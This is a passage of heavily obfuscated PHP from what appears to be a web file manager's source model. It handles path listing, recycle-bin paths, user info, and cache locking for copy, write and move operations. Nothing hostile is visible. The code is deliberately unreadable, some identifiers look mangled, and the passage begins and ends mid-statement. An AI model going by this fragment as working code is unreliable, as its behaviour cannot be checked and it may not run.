Model($B‚æ®•…äº[484])->getInfo($A““êõ·»ò[$B‚æ®•…äº[482]]); goto D¢Şö¤·í; cœ‘¢ê¥ˆÄ: $A““êõ·»ò[$B‚æ®•…äº[490]] = $C¾óù¼ƒŸ‹ . $F”¹óæ“™ª[$B‚æ®•…äº[85]][$B‚æ®•…äº[394]]; goto EŸóª‹Ú…ä; EŸóª‹Ú…ä: } protected function _listAppendPath(&$F±—»Ü¥ ›) { goto d£ ÏË¯ªØ; CĞ´‘½÷å: $A©‡ù¼‘Ú£ = array_unique($A©‡ù¼‘Ú£); if (count($A©‡ù¼‘Ú£) > 0) { $D½÷ë°¾± = array($E´è…²ğ“[408] => array($E´è…²ğ“[409], $A©‡ù¼‘Ú£)); if (count($A©‡ù¼‘Ú£) == 1) { $D æ•«Ğø› = $this->sourceInfo($A©‡ù¼‘Ú£[0]); $Bâ”ÚÓß¶ = is_array($D æ•«Ğø›) ? array($D æ•«Ğø›) : !1; } else { $Bâ”ÚÓß¶ = $this->field($E´è…²ğ“[491])->where($D½÷ë°¾±)->select(); } if (!$Bâ”ÚÓß¶) { $Bâ”ÚÓß¶ = array(); } foreach ($Bâ”ÚÓß¶ as $AñÚ¹™Ş•·) { $dó¿ÄÉãº½[$AñÚ¹™Ş•·[$E´è…²ğ“[394]]] = $AñÚ¹™Ş•·[$E´è…²ğ“[28]]; } } $DšÎÓ®çÀö = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto dğàÂº±ˆæ; d£ ÏË¯ªØ: $E´è…²ğ“ =& $_SERVER[Ïº«‚ßèÔˆø]; static $dó¿ÄÉãº½ = array(); $A©‡ù¼‘Ú£ = array(); goto b® šçÈëÍ; e‘¨ÈÔ­ÉŠ: unset($D”åÔå­à); return $F±—»Ü¥ ›; goto d•á­ÎîÙƒ; dğàÂº±ˆæ: $e¯×²Ÿ«È¢ = array(); $F¯ŠƒÈİİ² = array(); foreach ($F±—»Ü¥ › as &$D”åÔå­à) { goto bÚùöÍåõ‚; bÚùöÍåõ‚: $b©ÙÃ»ˆ = $D”åÔå­à[$E´è…²ğ“[485]]; if (isset($F¯ŠƒÈİİ²[$b©ÙÃ»ˆ])) { $C±ÓøèÈ¼ = $e¯×²Ÿ«È¢[$b©ÙÃ»ˆ]; } else { $Cô³ùÔ¡ôŠ = $this->parentLevelArray($D”åÔå­à[$E´è…²ğ“[485]]); $Dí†çˆáĞ‚ = $E´è…²ğ“[492] . $D”åÔå­à[$E´è…²ğ“[402]] . $E´è…²ğ“[438] . $D”åÔå­à[$E´è…²ğ“[482]]; if ($e¯×²Ÿ«È¢[$Dí†çˆáĞ‚]) { $C±ÓøèÈ¼ = $e¯×²Ÿ«È¢[$Dí†çˆáĞ‚]; } else { $C±ÓøèÈ¼ = $this->_listAppendPathRoot($D”åÔå­à, $Cô³ùÔ¡ôŠ); $e¯×²Ÿ«È¢[$Dí†çˆáĞ‚] = $C±ÓøèÈ¼; } foreach ($Cô³ùÔ¡ôŠ as $eã³µÆ¹˜¦ => $c„£¾»»Â¤) { if ($eã³µÆ¹˜¦ == 0 && $C±ÓøèÈ¼ && $D”åÔå­à[$E´è…²ğ“[402]] == self::TYPE_GROUP) { continue; } if (isset($dó¿ÄÉãº½[$c„£¾»»Â¤])) { $C±ÓøèÈ¼ .= $dó¿ÄÉãº½[$c„£¾»»Â¤] . $E´è…²ğ“[8]; } } if ($Cô³ùÔ¡ôŠ) { $C±ÓøèÈ¼ .= $D”åÔå­à[$E´è…²ğ“[28]]; } $e¯×²Ÿ«È¢[$b©ÙÃ»ˆ] = $C±ÓøèÈ¼; } if ($D”åÔå­à[$E´è…²ğ“[401]]) { $C±ÓøèÈ¼ .= $E´è…²ğ“[8]; } goto EÂÚÀ‚ÃƒÏ; EÂÚÀ‚ÃƒÏ: $D”åÔå­à[$E´è…²ğ“[493]] = str_replace($E´è…²ğ“[494], $E´è…²ğ“[8], $C±ÓøèÈ¼); $eâïä’É—Æ = trim($D”åÔå­à[$E´è…²ğ“[493]], $E´è…²ğ“[8]); if ($D”åÔå­à[$E´è…²ğ“[476]] == $E´è…²ğ“[495] && $eâïä’É—Æ) { $D”åÔå­à[$E´è…²ğ“[28]] = $eâïä’É—Æ; } goto C™á»áªæá; C™á»áªæá: if (intval($D”åÔå­à[$E´è…²ğ“[402]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($D”åÔå­à, $Cô³ùÔ¡ôŠ, $DšÎÓ®çÀö); } goto a«…†İÚ»•; a«…†İÚ»•: } goto e‘¨ÈÔ­ÉŠ; b® šçÈëÍ: $e”–·íŞÓ‡ = array(); foreach ($F±—»Ü¥ › as &$D”åÔå­à) { $b³ŞîœÒœ• = $D”åÔå­à[$E´è…²ğ“[401]] == $E´è…²ğ“[87]; if ($b³ŞîœÒœ•) { $dó¿ÄÉãº½[$D”åÔå­à[$E´è…²ğ“[394]]] = $D”åÔå­à[$E´è…²ğ“[28]]; } if (isset($e”–·íŞÓ‡[$D”åÔå­à[$E´è…²ğ“[485]]])) { continue; } $e”–·íŞÓ‡[$D”åÔå­à[$E´è…²ğ“[485]]] = !0; $Cô³ùÔ¡ôŠ = $this->parentLevelArray($D”åÔå­à[$E´è…²ğ“[485]]); foreach ($Cô³ùÔ¡ôŠ as $eã³µÆ¹˜¦ => $c„£¾»»Â¤) { if ($eã³µÆ¹˜¦ != 0 && !isset($dó¿ÄÉãº½[$c„£¾»»Â¤])) { $A©‡ù¼‘Ú£[] = $c„£¾»»Â¤; } } } unset($D”åÔå­à); goto CĞ´‘½÷å; d•á­ÎîÙƒ: } private function _listAppendPathRecycle(&$B·öŠ“…òƒ, $a¼·É†…”, $dˆæÔ‘ß) { goto C‹ÇáÎÀñ²; Eˆ´É×°´: if ($B·öŠ“…òƒ[$C®‘ø†ç”ø[394]] == $dˆæÔ‘ß) { $B·öŠ“…òƒ[$C®‘ø†ç”ø[485]] = $C®‘ø†ç”ø[497]; $B·öŠ“…òƒ[$C®‘ø†ç”ø[476]] = $C®‘ø†ç”ø[495]; $B·öŠ“…òƒ[$C®‘ø†ç”ø[28]] = LNG($C®‘ø†ç”ø[496]); } $B·öŠ“…òƒ[$C®‘ø†ç”ø[498]] = $C®‘ø†ç”ø[499]; goto eõÅÎ˜ñ×Æ; C‹ÇáÎÀñ²: $C®‘ø†ç”ø =& $_SERVER[Ïº«‚ßèÔˆø]; if (!in_array($dˆæÔ‘ß, $a¼·É†…”) && $B·öŠ“…òƒ[$C®‘ø†ç”ø[394]] != $dˆæÔ‘ß) { return; } $fÔ´İ¶‹Ùâ = explode($C®‘ø†ç”ø[8], trim($B·öŠ“…òƒ[$C®‘ø†ç”ø[493]], $C®‘ø†ç”ø[8])); goto Bö™…’³; Bö™…’³: $FŒ¯ïóŸùì = implode($C®‘ø†ç”ø[8], array_slice($fÔ´İ¶‹Ùâ, 2)); $B·öŠ“…òƒ[$C®‘ø†ç”ø[493]] = $C®‘ø†ç”ø[8] . LNG($C®‘ø†ç”ø[496]) . $C®‘ø†ç”ø[8] . ltrim($FŒ¯ïóŸùì, $C®‘ø†ç”ø[8]); $B·öŠ“…òƒ[$C®‘ø†ç”ø[485]] = $C®‘ø†ç”ø[497] . implode($C®‘ø†ç”ø[47], array_slice($a¼·É†…”, 1)) . $C®‘ø†ç”ø[47]; goto Eˆ´É×°´; eõÅÎ˜ñ×Æ: } protected function _listAppendPathRoot(&$B½«Ğ©™ò¿, $FÈÂĞ×ĞÖ) { $eÈÇ‚ÙŠâö =& $_SERVER[Ïº«‚ßèÔˆø]; $BØÅ¢“Ü·‹ = $eÈÇ‚ÙŠâö[33]; if ($B½«Ğ©™ò¿[$eÈÇ‚ÙŠâö[402]] == self::TYPE_USER) { if (defined($eÈÇ‚ÙŠâö[452]) && $B½«Ğ©™ò¿[$eÈÇ‚ÙŠâö[482]] == USER_ID) { $BØÅ¢“Ü·‹ = LNG($eÈÇ‚ÙŠâö[500]); if (!$FÈÂĞ×ĞÖ) { $B½«Ğ©™ò¿[$eÈÇ‚ÙŠâö[28]] = $BØÅ¢“Ü·‹; } } else { $DŒÅÂ¡‘‡© = Model($eÈÇ‚ÙŠâö[501])->getInfoSimple($B½«Ğ©™ò¿[$eÈÇ‚ÙŠâö[482]]); $BØÅ¢“Ü·‹ = LNG($eÈÇ‚ÙŠâö[502]) . $eÈÇ‚ÙŠâö[160] . $DŒÅÂ¡‘‡©[$eÈÇ‚ÙŠâö[28]] . $eÈÇ‚ÙŠâö[503]; } } else { if ($B½«Ğ©™ò¿[$eÈÇ‚ÙŠâö[402]] == self::TYPE_GROUP) { $DŒÅÂ¡‘‡© = Model($eÈÇ‚ÙŠâö[484])->getInfoSimple($B½«Ğ©™ò¿[$eÈÇ‚ÙŠâö[482]]); $BØÅ¢“Ü·‹ = $DŒÅÂ¡‘‡©[$eÈÇ‚ÙŠâö[28]]; } else { if ($B½«Ğ©™ò¿[$eÈÇ‚ÙŠâö[402]] == self::TYPE_SYSTEM) { $BØÅ¢“Ü·‹ = $eÈÇ‚ÙŠâö[504]; } } } $BØÅ¢“Ü·‹ = $BØÅ¢“Ü·‹ ? $eÈÇ‚ÙŠâö[8] . $BØÅ¢“Ü·‹ . $eÈÇ‚ÙŠâö[8] : $eÈÇ‚ÙŠâö[8]; return $BØÅ¢“Ü·‹; } protected function _listAppendUser(&$dË‡ÃÀæ®) { goto bí¨ÓÒø–‰; eÀê š¶““: $F‘¡‘¥¸šğ = array_merge($dÊ‡®ÏÒ‰Æ, $F˜ËÕˆ¸¼); $fêîóÑòî° = Model($b°Ç…æ› ª[505])->userListInfo($F‘¡‘¥¸šğ); foreach ($dË‡ÃÀæ® as &$B¾Ã™æ¦íì) { $c¶Œã¹ôØš = $B¾Ã™æ¦íì[$b°Ç…æ› ª[430]]; $B¾Ã™æ¦íì[$b°Ç…æ› ª[430]] = $fêîóÑòî°[$c¶Œã¹ôØš] ? $fêîóÑòî°[$c¶Œã¹ôØš] : !1; $c¶Œã¹ôØš = $B¾Ã™æ¦íì[$b°Ç…æ› ª[432]]; $B¾Ã™æ¦íì[$b°Ç…æ› ª[432]] = $fêîóÑòî°[$c¶Œã¹ôØš] ? $fêîóÑòî°[$c¶Œã¹ôØš] : !1; if (isset($B¾Ã™æ¦íì[$b°Ç…æ› ª[443]]) && $B¾Ã™æ¦íì[$b°Ç…æ› ª[443]][$b°Ç…æ› ª[506]]) { $FĞ¶‘åÈÙİ = $GLOBALS[$b°Ç…æ› ª[6]][$b°Ç…æ› ª[88]][$b°Ç…æ› ª[507]]; if ($B¾Ã™æ¦íì[$b°Ç…æ› ª[443]][$b°Ç…æ› ª[508]] <= time() - $FĞ¶‘åÈÙİ) { $this->metaSet($B¾Ã™æ¦íì[$b°Ç…æ› ª[394]], $b°Ç…æ› ª[506], null); $this->metaSet($B¾Ã™æ¦íì[$b°Ç…æ› ª[394]], $b°Ç…æ› ª[508], null); unset($B¾Ã™æ¦íì[$b°Ç…æ› ª[443]][$b°Ç…æ› ª[506]]); continue; } $C«¼—‘îŠ = $B¾Ã™æ¦íì[$b°Ç…æ› ª[443]][$b°Ç…æ› ª[506]]; $B¾Ã™æ¦íì[$b°Ç…æ› ª[443]][$b°Ç…æ› ª[509]] = Model($b°Ç…æ› ª[505])->getInfoSimpleOuter($C«¼—‘îŠ); } } goto D±Âãœ‹°¢; D±Âãœ‹°¢: unset($B¾Ã™æ¦íì); goto F ‘‘ŸÜ; bí¨ÓÒø–‰: $b°Ç…æ› ª =& $_SERVER[Ïº«‚ßèÔˆø]; $dÊ‡®ÏÒ‰Æ = array_to_keyvalue($dË‡ÃÀæ®, $b°Ç…æ› ª[33], $b°Ç…æ› ª[430]); $F˜ËÕˆ¸¼ = array_to_keyvalue($dË‡ÃÀæ®, $b°Ç…æ› ª[33], $b°Ç…æ› ª[432]); goto eÀê š¶““; F ‘‘ŸÜ: } public function parentLevelArray($E×•›êöÙ’) { $c¯½ó‡áÉ´ =& $_SERVER[Ïº«‚ßèÔˆø]; $E×•›êöÙ’ = explode($c¯½ó‡áÉ´[47], trim($E×•›êöÙ’, $c¯½ó‡áÉ´[47])); return array_remove_value($E×•›êöÙ’, $c¯½ó‡áÉ´[495]); } public function listAll($A‹ë¡­ª) { goto d–å¼Á‚³±; f‘…–…ªµÍ: $Cä®‰Ï³å¹ = $eòˆæ‡İä[514]; $Fœªä¥öèÕ = "\x4c\105\x46\x54\40\x4a\x4f\111\116\x20{$this->tablePrefix}\151\x6f\x5f\x66\x69\x6c\x65\40\146\151\x6c\x65\40\x6f\156\x20\163\x6f\x75\x72\143\145\x2e\x66\151\154\145\x49\x44\40\x3d\40\x66\x69\154\x65\56\146\x69\x6c\x65\x49\104"; $FŠ…Ô‘éˆÕ = $this->alias($eòˆæ‡İä[515])->field($Cä®‰Ï³å¹)->where($A¾å¬¹ñ¢ç)->join($Fœªä¥öèÕ)->select(); goto bµáê²œ‚¡; fÉ·¹íä: $Aòº•˜è¨ = array(); foreach ($FŠ…Ô‘éˆÕ as $C‘ˆ½Ş—‚¶ => $c×¯äëÇ£æ) { goto cÚïè¿ä¬Š; cÚïè¿ä¬Š: $eÛœÚÍ‰Ü = $this->parentLevelArray($c×¯äëÇ£æ[$eòˆæ‡İä[485]]); array_shift($eÛœÚÍ‰Ü); $c¼Ñ®½—•ö = $aß³·Ú¹¶Š; goto dÏæ¼ö¡–; dÏæ¼ö¡–: for ($eªÁ…ãš‰ = 0; $eªÁ…ãš‰ < count($eÛœÚÍ‰Ü); $eªÁ…ãš‰++) { $c¼Ñ®½—•ö .= $FŠ…Ô‘éˆÕ[$eÛœÚÍ‰Ü[$eªÁ…ãš‰]][$eòˆæ‡İä[28]] . $eòˆæ‡İä[8]; } $c¼Ñ®½—•ö .= $c×¯äëÇ£æ[$eòˆæ‡İä[28]]; if ($c×¯äëÇ£æ[$eòˆæ‡İä[401]]) { $c¼Ñ®½—•ö .= $eòˆæ‡İä[8]; } goto F…ã®äŠá; F…ã®äŠá: $c¼Ñ®½—•ö = str_replace($eòˆæ‡İä[494], $eòˆæ‡İä[8], $c¼Ñ®½—•ö); $c¼Ñ®½—•ö = str_replace($eòˆæ‡İä[494], $eòˆæ‡İä[8], $c¼Ñ®½—•ö); $Bõ£·½Ù´“ = array($eòˆæ‡İä[412] => str_replace($eòˆæ‡İä[494], $eòˆæ‡İä[8], $c¼Ñ®½—•ö), $eòˆæ‡İä[516] => intval($c×¯äëÇ£æ[$eòˆæ‡İä[401]]), $eòˆæ‡İä[85] => $this->pathInfoFilter($c×¯äëÇ£æ)); goto Cä¸¿¬áæ¬; Cä¸¿¬áæ¬: if (!$c×¯äëÇ£æ[$eòˆæ‡İä[401]]) { $Bõ£·½Ù´“[$eòˆæ‡İä[445]] = $c×¯äëÇ£æ[$eòˆæ‡İä[445]]; $Bõ£·½Ù´“[$eòˆæ‡İä[86]] = $c×¯äëÇ£æ[$eòˆæ‡İä[76]]; } $Aòº•˜è¨[] = $Bõ£·½Ù´“; goto D‚×ÊïŒ¿; D‚×ÊïŒ¿: } return $Aòº•˜è¨; goto fìÕƒ¢“ù£; d–å¼Á‚³±: $eòˆæ‡İä =& $_SERVER[Ïº«‚ßèÔˆø]; $dÀòìîéËÎ = $this->sourceInfo($A‹ë¡­ª); $A¾å¬¹ñ¢ç = array($eòˆæ‡İä[510] => array($eòˆæ‡İä[511], $dÀòìîéËÎ[$eòˆæ‡İä[485]] . $A‹ë¡­ª . $eòˆæ‡İä[512]), $eòˆæ‡İä[513] => 0); goto f‘…–…ªµÍ; bµáê²œ‚¡: $this->_listAppendAuth($FŠ…Ô‘éˆÕ); $this->_listAppendUser($FŠ…Ô‘éˆÕ); $this->_listAppendPath($FŠ…Ô‘éˆÕ); goto f£Ï¤£ë×£; f£Ï¤£ë×£: $FŠ…Ô‘éˆÕ = array_to_keyvalue($FŠ…Ô‘éˆÕ, $eòˆæ‡İä[394]); $aß³·Ú¹¶Š = "\57{$dÀòìîéËÎ[$eòˆæ‡İä[28]]}\x2f"; $aß³·Ú¹¶Š = $aß³·Ú¹¶Š == $eòˆæ‡İä[494] ? $eòˆæ‡İä[8] : $aß³·Ú¹¶Š; goto fÉ·¹íä; fìÕƒ¢“ù£: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($dß«¢¢±ë£) { goto C´Æáô—Æã; FÏÖ´Í¯ø: $DŒ³ò¦Öø¬ = 1; $this->_lockEvent($dß«¢¢±ë£, array($E‘Ù¬Ş± ¸[518], $E‘Ù¬Ş± ¸[519]), $DŒ³ò¦Öø¬); $this->_lockParent($dß«¢¢±ë£, array($E‘Ù¬Ş± ¸[519]), $DŒ³ò¦Öø¬); goto E¶ù‘¡—®; C´Æáô—Æã: $E‘Ù¬Ş± ¸ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->allowLock()) { return; } $this->_lockCheck($E‘Ù¬Ş± ¸[517], $dß«¢¢±ë£); goto FÏÖ´Í¯ø; E¶ù‘¡—®: $this->_lockEvent($dß«¢¢±ë£, array($E‘Ù¬Ş± ¸[520], $E‘Ù¬Ş± ¸[521]), $DŒ³ò¦Öø¬); $this->_lockCheckEnd($E‘Ù¬Ş± ¸[517], $dß«¢¢±ë£); goto FÍš­¼ĞŠ¶; FÍš­¼ĞŠ¶: } public function lockCopyEnd($Bäï´ğ½³) { $B÷¿¦Ü¢ã =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->allowLock()) { return; } $fãïµœŞƒ° = 0; $this->_lockEvent($Bäï´ğ½³, array($B÷¿¦Ü¢ã[518], $B÷¿¦Ü¢ã[519]), $fãïµœŞƒ°); $this->_lockParent($Bäï´ğ½³, array($B÷¿¦Ü¢ã[519]), $fãïµœŞƒ°); $this->_lockEvent($Bäï´ğ½³, array($B÷¿¦Ü¢ã[520], $B÷¿¦Ü¢ã[521]), $fãïµœŞƒ°); } public function lockWriteStart($F¾®¿ôä£š, $fäÜÀÁËçˆ = '') { goto Bèùñ×£²²; fµÈùš¸Öä: $this->_lockParent($F¾®¿ôä£š, array($EˆÚ¥ÊËãÉ[517], $EˆÚ¥ÊËãÉ[519]), $CƒÓ§®ªñ¨); $this->_lockCheckEnd($EˆÚ¥ÊËãÉ[518], $F¾®¿ôä£š); goto E¹â¥ÛëÈ; C¾’ÃµÑ‰ë: $CƒÓ§®ªñ¨ = 1; $this->_lockKey($EˆÚ¥ÊËãÉ[522] . $F¾®¿ôä£š . $EˆÚ¥ÊËãÉ[95] . $fäÜÀÁËçˆ, $CƒÓ§®ªñ¨); $this->_lockEvent($F¾®¿ôä£š, array($EˆÚ¥ÊËãÉ[517], $EˆÚ¥ÊËãÉ[519]), $CƒÓ§®ªñ¨); goto fµÈùš¸Öä; Bèùñ×£²²: $EˆÚ¥ÊËãÉ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->allowLock()) { return; } $this->_lockCheck($EˆÚ¥ÊËãÉ[518], $F¾®¿ôä£š); goto C¾’ÃµÑ‰ë; E¹â¥ÛëÈ: } public function lockWriteEnd($Bò—ÙƒÚ°, $cÔÏ¡àÊ¸½ = '') { $A´Åç·´›é =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->allowLock()) { return; } $cõÊŠ‘§£ò = 0; $this->_lockKey($A´Åç·´›é[522] . $Bò—ÙƒÚ° . $A´Åç·´›é[95] . $cÔÏ¡àÊ¸½, $cõÊŠ‘§£ò); $this->_lockEvent($Bò—ÙƒÚ°, array($A´Åç·´›é[517], $A´Åç·´›é[519]), $cõÊŠ‘§£ò); $this->_lockParent($Bò—ÙƒÚ°, array($A´Åç·´›é[517], $A´Åç·´›é[519]), $cõÊŠ‘§£ò); } public function lockMoveStart($C¯Ë‚¸š¦) { goto FÍîƒ¨ˆ¡¹; FÍîƒ¨ˆ¡¹: $Aîô…ÜÚäÉ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->allowLock()) { return; } $this->_lockCheck($Aîô…ÜÚäÉ[519], $C¯Ë‚¸š¦); goto eäÄğ¸ÖŠ; aéµ¼è‚¨ : $this->_lockParent($C¯Ë‚¸š¦, array($Aîô…ÜÚäÉ[517], $Aîô…ÜÚäÉ[519]), $cÏõÛ‘ìŸğ); $this->_lockEvent($C¯Ë‚¸š¦, array($Aîô…ÜÚäÉ[524], $Aîô…ÜÚäÉ[520], $Aîô…ÜÚäÉ[521]), $cÏõÛ‘ìŸğ); $this->_lockCheckEnd($Aîô…ÜÚäÉ[519], $C¯Ë‚¸š¦); goto b‡”‡ÈÓƒ; eäÄğ¸ÖŠ: $cÏõÛ‘ìŸğ = 1; $this->_lockKey($Aîô…ÜÚäÉ[523] . $C¯Ë‚¸š¦, $cÏõÛ‘ìŸğ); $this->_lockEvent($C¯Ë‚¸š¦, array($Aîô…ÜÚäÉ[517], $Aîô…ÜÚäÉ[518]), $cÏõÛ‘ìŸğ); goto aéµ¼è‚¨ ; b‡”‡ÈÓƒ: } public function lockMoveEnd($e¤ŞÜœÉòö) { goto Fò±ïôÃ•; fÙ“Šš¼¯: $this->_lockKey($f¿×½ºÒ’[523] . $e¤ŞÜœÉòö, $EØ© ö­¥ñ); $this->_lockEvent($e¤ŞÜœÉòö, array($f¿×½ºÒ’[517], $f¿×½ºÒ’[518]), $EØ© ö­¥ñ); $this->_lockParent($e¤ŞÜœÉòö, array($f¿×½ºÒ’[517], $f¿×½ºÒ’[519]), $EØ© ö­¥ñ); goto D›¢±’Á¢â; D›¢±’Á¢â: $this->_lockEvent($e¤ŞÜœÉòö, array($f¿×½ºÒ’[524], $f¿×½ºÒ’[520], $f¿×½ºÒ’[521]), $EØ© ö­¥ñ); goto CÂß§»‚…; Fò±ïôÃ•: $f¿×½ºÒ’ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->allowLock()) { return; } $EØ© ö­¥ñ = 0; goto fÙ“Šš¼¯; CÂß§»‚…: } private function _lockCheck($dğ¾©ôÊŒ˜, $d‹í…Ó’¸²) { goto e÷ø ôˆé; e÷ø ôˆé: $f¼ïÑõ¡â =& $_SERVER[Ïº«‚ßèÔˆø]; $d¬³æù·Ô = $this->sourceInfo($d‹í…Ó’¸²); $fğ„Íâø½Û = $dğ¾©ôÊŒ˜ . $f¼ïÑõ¡â[95] . $d‹í…Ó’¸²; goto e‹”¶ÚÓ´; e‹”¶ÚÓ´: $this->_lockTimeStart[$fğ„Íâø½Û] = timeFloat(); if (!is_array($d¬³æù·Ô)) { return; } $AæÆÌÈÒ£‰ = LNG($f¼ïÑõ¡â[525]); goto dø§­•íõ‚; CÊê‹‘áïİ: $dñ‰²‹´•º = array_reverse($this->parentLevelArray($d¬³æù·Ô[$f¼ïÑõ¡â[485]])); foreach ($dñ‰²‹´•º as $fÀèË¤åíâ) { $fğ„Íâø½Û = $dğ¾©ôÊŒ˜ . $f¼ïÑõ¡â[526] . $fÀèË¤åíâ; if (CacheLock::lockGet($f¼ïÑõ¡â[527] . $fğ„Íâø½Û)) { $d¬³æù·Ô = $this->sourceInfo($fÀèË¤åíâ); CacheLock::setErrorMsg($f¼ïÑõ¡â[160] . htmlspecialchars($d¬³æù·Ô[$f¼ïÑõ¡â[28]]) . $f¼ïÑõ¡â[503] . $AæÆÌÈÒ£‰); $this->_lockKey($fğ„Íâø½Û, 1); $this->_lockKey($fğ„Íâø½Û, 0); } } goto Aâ©°¢Õ—œ; dø§­•íõ‚: CacheLock::setErrorMsg($f¼ïÑõ¡â[160] . htmlspecialchars($d¬³æù·Ô[$f¼ïÑõ¡â[28]]) . $f¼ïÑõ¡â[503] . $AæÆÌÈÒ£‰); $this->_lockKey($fğ„Íâø½Û, 1); $this->_lockKey($fğ„Íâø½Û, 0); goto CÊê‹‘áïİ; Aâ©°¢Õ—œ: } private function _lockCheckEnd($CÃñÑù©â“, $d­Œ—ÊÇÚ) { goto f¾áÔ‰§Ò; C†ÛÓåÌÛ: if (!isset($this->_lockTimeStart[$C¿ÂÑŠë¶Ÿ])) { return; } $FÃßóå³§™ = timeFloat() - $this->_lockTimeStart[$C¿ÂÑŠë¶Ÿ]; unset($this->_lockTimeStart[$C¿ÂÑŠë¶Ÿ]); goto C…ÃÁÑéÒ; f¾áÔ‰§Ò: $Bï†À˜¥™ï =& $_SERVER[Ïº«‚ßèÔˆø]; $C¿ÂÑŠë¶Ÿ = $CÃñÑù©â“ . $Bï†À˜¥™ï[95] . $d­Œ—ÊÇÚ; CacheLock::setErrorMsg($Bï†À˜¥™ï[374]); goto C†ÛÓåÌÛ; C…ÃÁÑéÒ: if ($FÃßóå³§™ > 0.5) { unset(self::$cacheSourceInfo[$Bï†À˜¥™ï[436] . $d­Œ—ÊÇÚ]); } $E³¿¦ÏèóŒ = $this->sourceInfo($d­Œ—ÊÇÚ); if (!$E³¿¦ÏèóŒ) { show_json(LNG($Bï†À˜¥™ï[105]), !1); } goto d†ô­¯×ñ; d†ô­¯×ñ: } private function _lockParent($cºÚÈÂ‹ÁÌ, $FÀŠ¥‹†–Æ, $D¢ÑÛ¯·¸) { if (!$this->autoLockSet) { return; } $dªÄç…Ö¦ñ = $this->sourceInfo($cºÚÈÂ‹ÁÌ); if (!is_array($dªÄç…Ö¦ñ)) { return; } $c£ÕšÙî§Å = array_reverse($this->parentLevelArray($dªÄç…Ö¦ñ[$_SERVER[Ïº«‚ßèÔˆø][485]])); foreach ($c£ÕšÙî§Å as $DÜ»ˆòá·Ç) { $this->_lockEvent($DÜ»ˆòá·Ç, $FÀŠ¥‹†–Æ, $D¢ÑÛ¯·¸); } } private function _lockEvent($E¶ÌáÆÛ, $a¥ÊÜ«Äô°, $c³Ì˜™àÚ‹) { $AáÛ‘ ÑÈæ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->autoLockSet) { return; } foreach ($a¥ÊÜ«Äô° as $Aò¾Õô¼Ø) { $fì‰â•Åä’ = $Aò¾Õô¼Ø . $AáÛ‘ ÑÈæ[95] . $E¶ÌáÆÛ; if ($c³Ì˜™àÚ‹ && CacheLock::lockGet($AáÛ‘ ÑÈæ[527] . $fì‰â•Åä’)) { continue; } $this->_lockKey($fì‰â•Åä’, $c³Ì˜™àÚ‹); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($D¹Ã ÙØÏó, $cÕ™Š†„¤ø = 1) { $c¸ù®¬ĞÑº = $_SERVER[Ïº«‚ßèÔˆø][527] . md5($D¹Ã ÙØÏó); if ($cÕ™Š†„¤ø) { if (isset(self::$_lockItemArr[$c¸ù®¬ĞÑº])) { return; } self::$_lockItemArr[$c¸ù®¬ĞÑº] = 1; CacheLock::lock($c¸ù®¬ĞÑº, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$c¸ù®¬ĞÑº])) { return; } unset(self::$_lockItemArr[$c¸ù®¬ĞÑº]); CacheLock::unlock($c¸ù®¬ĞÑº); } } public function isParentOf($cäÌ±É„Â¾, $EŞë‰Ş ß½) { goto CÜÈô©á; bõ¶÷¤«Œ²: $A·˜•ŞÚ” = $E×‹ÌÓ§‚ô[$eÒù‡ˆ°ğ[485]] . $E×‹ÌÓ§‚ô[$eÒù‡ˆ°ğ[394]] . $eÒù‡ˆ°ğ[47]; $AÉ¶®¼î = $b®Ä³†İ¹[$eÒù‡ˆ°ğ[485]] . $b®Ä³†İ¹[$eÒù‡ˆ°ğ[394]] . $eÒù‡ˆ°ğ[47]; $B£ºÁ¼ÕÓá = strpos($AÉ¶®¼î, $A·˜•ŞÚ”) === 0; goto C°˜ØÃÎ­í; C°˜ØÃÎ­í: return $B£ºÁ¼ÕÓá; goto a§ÔÛ’ùÂğ; CÜÈô©á: $eÒù‡ˆ°ğ =& $_SERVER[Ïº«‚ßèÔˆø]; $E×‹ÌÓ§‚ô = $this->sourceInfo($cäÌ±É„Â¾); $b®Ä³†İ¹ = $this->sourceInfo($EŞë‰Ş ß½); goto bõ¶÷¤«Œ²; a§ÔÛ’ùÂğ: } private $targetIsDelete = 0; public function copy($AÛÓÂ”ô—, $B¤âíœÎ¹Ã, $dœœ¢¼¾ÅÃ = REPEAT_REPLACE, $E‰ô‹Ã„§¬ = '') { goto f‰ÂÖùß–„; b„˜¤Ù‘â: if (!$d¼…†•å£ö || !$a”ÂíÏëÆº || $a”ÂíÏëÆº[$b‹’ñ‹ Ş[401]] != $b‹’ñ‹ Ş[87]) { return !1; } if ($this->isParentOf($AÛÓÂ”ô—, $B¤âíœÎ¹Ã)) { return !1; } $C†ÃÅöÂ¸‚ = $E‰ô‹Ã„§¬ ? $E‰ô‹Ã„§¬ : $d¼…†•å£ö[$b‹’ñ‹ Ş[28]]; goto f—Ä‚÷ã”; F¬ŞÕáÅÃÂ: if ($d¼…†•å£ö[$b‹’ñ‹ Ş[401]] == $b‹’ñ‹ Ş[87] && $eëåßë›© == $BÆ–“Åµ) { $this->folderSizeResetChildren($eëåßë›©); } Model($b‹’ñ‹ Ş[531])->addAll($aˆÛ’äÅ¶[$b‹’ñ‹ Ş[529]], array(), !0); if ($eëåßë›© != $BÆ–“Åµ || $d¼…†•å£ö[$b‹’ñ‹ Ş[401]] == $b‹’ñ‹ Ş[87]) { Model($b‹’ñ‹ Ş[532])->eventCopy($BÆ–“Åµ); } goto Cœ£†ÁŞÆ„; f—Ä‚÷ã”: $this->lockCopyStart($AÛÓÂ”ô—); $this->lockWriteStart($B¤âíœÎ¹Ã, $C†ÃÅöÂ¸‚); $aˆÛ’äÅ¶ = array($b‹’ñ‹ Ş[528] => array(), $b‹’ñ‹ Ş[529] => array(), $b‹’ñ‹ Ş[530] => array()); goto aŒÄÑ¬‹å¹; f‰ÂÖùß–„: $b‹’ñ‹ 